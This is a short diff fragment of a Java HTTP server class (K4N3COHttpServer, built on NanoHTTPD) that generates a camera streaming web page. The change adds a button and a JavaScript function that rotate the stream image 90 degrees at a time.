+                "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
+        html.append(
                 "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
         html.append(
                 "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
@@ -1276,6 +1397,13 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append("var lastFpsTime = Date.now();");
         html.append("var errorCount = 0;");
         html.append("var streamActive = true;");
+        html.append("var currentRotation = 0;");
+
+        // Rotate stream function
+        html.append("function rotateStream() {");
+        html.append("  currentRotation = (currentRotation + 90) % 360;");
+        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
+        html.append("}");
 
         // Start streaming with current resolution
         html.append("function startStream() {");
